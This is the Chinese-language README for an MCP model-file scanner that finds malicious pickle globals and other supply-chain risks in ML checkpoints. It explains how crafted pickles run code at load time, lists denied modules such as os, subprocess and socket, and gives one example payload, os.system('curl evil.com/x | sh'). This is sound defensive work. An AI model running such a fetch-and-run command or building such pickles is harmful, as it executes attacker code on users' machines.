# @guardbee/mcp-model-scanner

[🇬🇧 English](README.md) | [🇹🇷 Türkçe](TR.md) | **🇨🇳 中文**

一个 MCP（Model Context Protocol）服务器，用于扫描 ML 模型文件的**供应链**风险——扫的是文件本身，而不是加载它的代码。

大多数“AI 安全”工具看的是你的集成代码或流经其中的提示。本包看的是你（或同事，或 `pip install`）从 Hugging Face、注册表或 S3 桶下载的产物：`.pt`/`.pth`/`.pkl` checkpoint 是 **pickle** 文件，反序列化不只是数据反序列化——文件加载瞬间就可以调用任意 Python 代码（`torch.load()`、`pickle.load()` 等）。恶意 checkpoint 是真实、有充分文档记载的攻击向量，而非假想。

> 本包默认发送使用遥测（工具名 + 较短的参数，绝不包含被扫描文件的内容——见 [`@guardbee/mcp-telemetry`](../telemetry/README.md)）。设置 `GUARDBEE_TELEMETRY=0` 即可关闭。

```
Claude ──► model-scanner ──► Your model files
              │
              ├─ .pt / .pth / .ckpt   → PyTorch zip container: extract data.pkl, disassemble
              ├─ .pkl / .pickle / .bin → raw pickle stream, disassemble directly
              ├─ .safetensors         → header structure + disguised-binary check
              ├─ .h5 / .hdf5 / .keras → Keras Lambda-layer RCE heuristic
              └─ .onnx                → external_data path-traversal heuristic
```

---

## 为什么 pickle 是核心

Pickle 流是一个小型栈式 VM 的字节码。`GLOBAL`/`STACK_GLOBAL` 操作码可以命名任何可导入的 Python 对象；紧接着的操作码通常会调用它。没有任何机制阻止精心构造的 pickle 去命名 `os.system` 或 `subprocess.Popen`，而不是张量重建函数——而 `pickle.load()`/`torch.load()` 会欣然解析并调用它。这就是 `picklescan`/`fickling`/Hugging Face 的 Picklescan 集成所围绕的同一技术。

本包实现了从零编写的 pickle 操作码反汇编器（协议 0–5，包括协议 4+ 使用的较新 `STACK_GLOBAL` 编码），而不是 shell 出到 Python 或使用正则——必须逐字节正确遍历操作码流，才能知道每个 `GLOBAL` 引用实际在哪里；对原始字节做正则既会漏报也会不断误报。

发现的每个 `GLOBAL`/`STACK_GLOBAL`/`INST` 引用都会对照：
- **拒绝列表**：在张量反序列化路径中没有正当理由出现的模块（`os`、`subprocess`、`socket`、`builtins.eval`、`ctypes`、…）→ 报告为 **critical/high**
- **允许列表**：真实 ML 框架实际会引用的模块（`numpy`、`torch`、`sklearn`、`collections`、…）→ 静默安全，无噪声
- 其他 → 报告为 **medium**（“未知”，而非“恶意”——供人工复核，保持低误报率）

对于 PyTorch 默认的基于 zip 的 checkpoint 格式，扫描器直接从磁盘读取 ZIP 中央目录（支持 Zip64），定位并仅提取较小的 `data.pkl` 元数据条目——从不把数 GB 的 checkpoint 完整加载进内存。

---

## 功能

- **真正的 pickle 操作码反汇编** — 不是正则，也不是 Python 子进程调用
- **31 条危险 global 规则**，覆盖 6 个风险类别（code-execution、process-execution、network、filesystem、reflection、deserialization）
- **PyTorch zip 容器支持**（含 Zip64）— 提取并扫描 `data.pkl`，无需加载完整 checkpoint
- **`.safetensors` 结构校验** — 畸形/越界头，以及用 `.safetensors` 扩展名伪装的 pickle/zip 检测
- **Keras `.h5`/`.keras` Lambda 层 RCE 启发式**
- **ONNX `external_data` 路径遍历启发式**
- 处处有界读取（10MB pickle 前缀、100MB safetensors 头上限、50MB zip 条目上限）— 抵御解压炸弹，不会在巨大模型文件上 OOM
- SARIF 2.1.0 输出 — CI/CD 集成（GitHub Code Scanning 等）
- 通过 `guardbee.yml` 支持配置文件
- 45 个单元测试，外加对真实 CPython-`pickle` 与 `zipfile` 生成的 fixture 的端到端验证（不只是手写 fixture）

---

## 快速开始

### Claude Desktop / MCP 客户端

```json
{
  "mcpServers": {
    "guardbee-model-scanner": {
      "command": "npx",
      "args": ["-y", "@guardbee/mcp-model-scanner"]
    }
  }
}
```

### CLI（CI/CD）

```bash
npx @guardbee/mcp-model-scanner scan ./models --fail-on=high --format=sarif > results.sarif
```

---

## MCP 工具

| 工具 | 说明 |
|------|----------|
| `scan_file` | 扫描单个模型文件 |
| `scan_directory` | 递归扫描模型文件目录 |
| `list_patterns` | 按风险类别列出危险 global 目录 |

---

## 捕获内容

| 格式 | 检查 | 严重级别 | 示例 |
|---|---|---|---|
| pickle / PyTorch | 引用 `os`、`posix`、`nt`、`subprocess`、`socket`、`ctypes`、`runpy`、`pty.spawn`、`platform.popen`、`commands` | critical | `os.system('curl evil.com/x \| sh')` |
| pickle / PyTorch | `builtins.eval`/`exec`/`compile`/`__import__`、`pickle.loads`、`marshal.loads` | critical | 递归/嵌套载荷，或直接 eval |
| pickle / PyTorch | `builtins.getattr`/`open`、`shutil.*`、`importlib.*`、`requests.*`、`webbrowser.open`、`urllib*.urlopen` | high | 外泄、SSRF、文件读写 |
| safetensors | 头以 pickle/zip 签名开头而非长度 | critical | `.pkl` 重命名为 `.safetensors` |
| safetensors | 张量 `data_offsets` 超出实际数据区 | high | 解析器越界读取 |
| safetensors | 无效/过大的头长度、非 JSON 头 | high | 损坏或对抗性构造的头 |
| Keras .h5/.keras | 模型配置中 `class_name: "Lambda"` | critical | 加载时序列化函数 RCE |
| ONNX | `external_data` 位置包含 `..` | high | 路径遍历到任意文件 |

完整危险 global 目录：运行 `list_patterns` 工具，或见 [`src/dangerousGlobals.ts`](src/dangerousGlobals.ts)。

这些是为低误报率调优的**启发式**发现——尤其 HDF5 与 ONNX 是复杂的二进制/protobuf 格式，通过有界文本模式搜索而非完整结构解析。每条发现仍应复核；干净扫描不是正式安全证明。

---

## 配置（`guardbee.yml`）

```yaml
model-scanner:
  fail-on: high       # any | critical | high | medium | low | none
  max-files: 2000
  exclude:
    - "fixtures/"
```

---

## 限制（设计如此）

- 仅扫描原始（非 zip）pickle 流的前 10MB——危险 global 必须在其实例之前被引用，因此该边界是相对把巨大遗留 checkpoint 完整加载进内存的合理权衡。
- ZIP 提取仅支持 STORED 与 DEFLATE（覆盖默认 PyTorch checkpoint 格式）。
- HDF5/ONNX 检查是基于有界前缀的模式匹配，而非完整结构/protobuf 解析。
- 扫描的是**文件**，而非运行时行为——不会执行或沙箱任何东西。

---

## 开发

```bash
npm run build
npm test             # 45 unit tests
```

---

## 许可证

MIT — [GuardBee](https://guardbee.ai)
